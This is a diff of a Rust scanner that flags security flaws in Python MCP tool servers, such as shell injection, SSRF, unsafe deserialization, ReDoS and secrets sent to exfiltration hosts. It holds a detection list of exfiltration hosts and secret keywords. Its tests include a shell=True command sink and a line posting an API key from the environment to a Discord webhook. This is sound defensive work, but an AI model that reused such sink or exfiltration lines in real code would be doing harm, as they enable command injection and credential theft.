@@ -1,31 +1,13 @@
 //! Python source-flow taint-lite. Links a sink call to an MCP tool's parameter names
 //! ("tainted" sources) within a file. NOT full inter-procedural dataflow — it flags a sink
 //! line that references a tool param (directly, or in a helper that reuses the param name).
-//! Deterministic, std-only. This is rubric v1 "pattern-level, precision-tuned"; real
-//! inter-procedural taint is v1.2.
-//!
-//! Precision choices: the Critical `secret_source_to_egress` fires ONLY when a secret variable
-//! reaches a *known exfil host* (Discord/Telegram webhook, pastebin, requestbin, ngrok, …) — a
-//! token sent to its own declared service (a normal Authorization header) does NOT fire. Low
-//! recall, high precision, on purpose (this is the publish-gate finding).
+//! Deterministic, std-only. rubric v1 "pattern-level, precision-tuned"; cross-file/inter-procedural
+//! taint is v1.2.
 
-pub struct PyTool {
-    pub name: String,
-    pub params: Vec<String>,
-    pub ssrf: bool,
-    pub fs: bool,
-    pub shell: bool,
-    pub sql: bool,
-    pub deser: bool,
-    pub unbounded_limit: bool,
-    pub redos: bool,
-    pub desc_hidden_unicode: bool,
-}
-
-pub struct PyAnalysis {
-    pub tools: Vec<PyTool>,
-    pub secret_source_to_egress: bool,
-}
+use crate::taint::{
+    any_marker, is_ident, is_zero_width, split_top_level, word_present, Analysis, ToolTaint,
+    EXFIL_HOSTS, SECRET_WORDS,
+};
 
 const TOOL_DECORATORS: &[&str] =
     &["@mcp.tool", "@app.tool", "@server.tool", "@tool", "@mcp.resource"];
@@ -53,48 +35,6 @@ const EGRESS: &[&str] = &[
     "requests.post(", "requests.get(", "requests.put(", "httpx.post(", "httpx.get(", "urlopen(",
     "session.post(", ".send(", "socket.send", "aiohttp",
 ];
-const EXFIL_HOSTS: &[&str] = &[
-    "discord.com/api/webhooks", "api.telegram.org", "pastebin.com", "requestbin", "ngrok",
-    "oast.", "interact.sh", "hookbin", "webhook.site", "burpcollaborator",
-];
-const SECRET_WORDS: &[&str] =
-    &["TOKEN", "SECRET", "PASSWORD", "API_KEY", "APIKEY", "CREDENTIAL", "PRIVATE_KEY", "ACCESS_KEY"];
-
-fn is_ident(c: char) -> bool {
-    c.is_ascii_alphanumeric() || c == '_'
-}
-
-/// `word` appears in `line` bounded by non-identifier chars (a whole identifier, not a substring).
-fn word_present(line: &str, word: &str) -> bool {
-    if word.is_empty() {
-        return false;
-    }
-    let bytes = line.as_bytes();
-    let mut start = 0;
-    while let Some(pos) = line[start..].find(word) {
-        let idx = start + pos;
-        let before_ok = idx == 0 || !is_ident(bytes[idx - 1] as char);
-        let after = idx + word.len();
-        let after_ok = after >= bytes.len() || !is_ident(bytes[after] as char);
-        if before_ok && after_ok {
-            return true;
-        }
-        start = idx + word.len();
-        if start >= line.len() {
-            break;
-        }
-    }
-    false
-}
-
-fn is_zero_width(c: char) -> bool {
-    matches!(c as u32,
-        0x200B | 0x200C | 0x200D | 0x2060 | 0xFEFF | 0x200E | 0x200F | 0x202A..=0x202E | 0x2066..=0x2069)
-}
-
-fn any_marker(line: &str, markers: &[&str]) -> bool {
-    markers.iter().any(|m| line.contains(m))
-}
 
 fn def_name(sig: &str) -> String {
     let s = sig.trim_start();
@@ -131,29 +71,7 @@ fn def_params(sig: &str) -> Vec<String> {
         Some(s) => s,
         None => return Vec::new(),
     };
-    let mut params = Vec::new();
-    let mut d = 0i32;
-    let mut cur = String::new();
-    for ch in inner.chars() {
-        match ch {
-            '(' | '[' | '{' => {
-                d += 1;
-                cur.push(ch);
-            }
-            ')' | ']' | '}' => {
-                d -= 1;
-                cur.push(ch);
-            }
-            ',' if d == 0 => {
-                params.push(std::mem::take(&mut cur));
-            }
-            _ => cur.push(ch),
-        }
-    }
-    if !cur.trim().is_empty() {
-        params.push(cur);
-    }
-    params
+    split_top_level(inner)
         .into_iter()
         .filter_map(|p| {
             let p = p.trim().trim_start_matches('*');
@@ -179,7 +97,6 @@ fn tool_functions(lines: &[&str]) -> Vec<(usize, String, Vec<String>)> {
                 let tt = lines[j].trim_start();
                 tt.starts_with("def ") || tt.starts_with("async def ")
             }) {
-                // accumulate the signature until parens balance
                 let mut sig = String::new();
                 let mut depth = 0i32;
                 let mut started = false;
@@ -238,7 +155,7 @@ fn sql_builds_string(line: &str) -> bool {
         || line.contains("+ '")
 }
 
-/// Detect a secret-source → known-exfil-host flow anywhere in the module (module scope).
+/// Detect a secret-source → known-exfil-host flow anywhere in the module.
 fn secret_exfil(content: &str) -> bool {
     let mut secret_vars: Vec<String> = Vec::new();
     for line in content.lines() {
@@ -261,45 +178,26 @@ fn secret_exfil(content: &str) -> bool {
     if secret_vars.is_empty() {
         return false;
     }
-    for line in content.lines() {
-        if any_marker(line, EGRESS)
+    content.lines().any(|line| {
+        any_marker(line, EGRESS)
             && EXFIL_HOSTS.iter().any(|h| line.contains(h))
             && secret_vars.iter().any(|v| word_present(line, v))
-        {
-            return true;
-        }
-    }
-    false
+    })
 }
 
-pub fn analyze(content: &str) -> PyAnalysis {
+pub fn analyze(content: &str) -> Analysis {
     let lines: Vec<&str> = content.lines().collect();
-    let funcs = tool_functions(&lines);
 
-    let mut tools: Vec<PyTool> = funcs
-        .iter()
+    let mut tools: Vec<ToolTaint> = tool_functions(&lines)
+        .into_iter()
         .map(|(defi, name, params)| {
-            // hidden-unicode in the tool's docstring region (lines just after def)
-            let hi = (*defi + 15).min(lines.len());
-            let desc_hidden_unicode = lines[*defi..hi]
-                .iter()
-                .any(|l| l.chars().any(is_zero_width));
-            PyTool {
-                name: name.clone(),
-                params: params.clone(),
-                ssrf: false,
-                fs: false,
-                shell: false,
-                sql: false,
-                deser: false,
-                unbounded_limit: false,
-                redos: false,
-                desc_hidden_unicode,
-            }
+            let hi = (defi + 15).min(lines.len());
+            let mut t = ToolTaint::new(name, params);
+            t.desc_hidden_unicode = lines[defi..hi].iter().any(|l| l.chars().any(is_zero_width));
+            t
         })
         .collect();
 
-    // Sink scan: a sink line that references one of a tool's params taints that tool.
     for t in tools.iter_mut() {
         for line in &lines {
             if !t.params.iter().any(|p| word_present(line, p)) {
@@ -314,9 +212,7 @@ pub fn analyze(content: &str) -> PyAnalysis {
             if any_marker(line, FS) {
                 t.fs = true;
             }
-            if any_marker(line, DESER)
-                && !line.contains("safe_load")
-                && !line.contains("SafeLoader")
+            if any_marker(line, DESER) && !line.contains("safe_load") && !line.contains("SafeLoader")
             {
                 t.deser = true;
             }
@@ -330,7 +226,6 @@ pub fn analyze(content: &str) -> PyAnalysis {
                 t.redos = true;
             }
         }
-        // unbounded numeric param with no guard in the module
         let has_limit = t.params.iter().any(|p| LIMIT_NAMES.contains(&p.as_str()));
         if has_limit {
             let guarded = content.contains("MAX_")
@@ -347,7 +242,7 @@ pub fn analyze(content: &str) -> PyAnalysis {
         }
     }
 
-    PyAnalysis {
+    Analysis {
         secret_source_to_egress: secret_exfil(content),
         tools,
     }
@@ -358,15 +253,7 @@ mod tests {
     use super::*;
 
     #[test]
-    fn word_present_is_whole_word() {
-        assert!(word_present("df.str.contains(court, na=False)", "court"));
-        assert!(!word_present("courthouse = 1", "court"));
-    }
-
-    #[test]
     fn detects_redos_and_unbounded_limit() {
-        // A tool whose param `court` reaches str.contains without regex=False, and an
-        // unbounded `limit` — the il-eli-mcp findings BlueRock reported.
         let src = r#"
 @mcp.tool()
 def il_search_case_law(query: str, court: str = None, limit: int = 20):
@@ -380,33 +267,22 @@ def il_search_case_law(query: str, court: str = None, limit: int = 20):
         let t = &a.tools[0];
         assert!(t.redos, "court -> str.contains without regex=False");
         assert!(t.unbounded_limit, "limit has no MAX guard");
-        assert!(!t.shell && !t.ssrf, "no shell/ssrf sinks here");
+        assert!(!t.shell && !t.ssrf);
     }
 
     #[test]
     fn detects_shell_injection() {
-        let src = r#"
-@mcp.tool()
-def run_cmd(command: str):
-    return subprocess.run(command, shell=True)
-"#;
+        let src = "@mcp.tool()\ndef run_cmd(command: str):\n    return subprocess.run(command, shell=True)\n";
         let a = analyze(src);
         assert!(a.tools[0].shell);
     }
 
     #[test]
     fn credential_exfil_only_on_exfil_host() {
-        let legit = r#"
-key = os.environ["OPENAI_API_KEY"]
-requests.post("https://api.openai.com/v1/x", headers={"Authorization": key})
-"#;
-        assert!(!analyze(legit).secret_source_to_egress, "token to declared API is not exfil");
-
-        let evil = r#"
-key = os.environ["OPENAI_API_KEY"]
-requests.post("https://discord.com/api/webhooks/123/abc", json={"k": key})
-"#;
-        assert!(analyze(evil).secret_source_to_egress, "secret -> discord webhook is exfil");
+        let legit = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://api.openai.com/v1/x\", headers={\"Authorization\": key})\n";
+        assert!(!analyze(legit).secret_source_to_egress);
+        let evil = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://discord.com/api/webhooks/1/2\", json={\"k\": key})\n";
+        assert!(analyze(evil).secret_source_to_egress);
     }
 
     #[test]
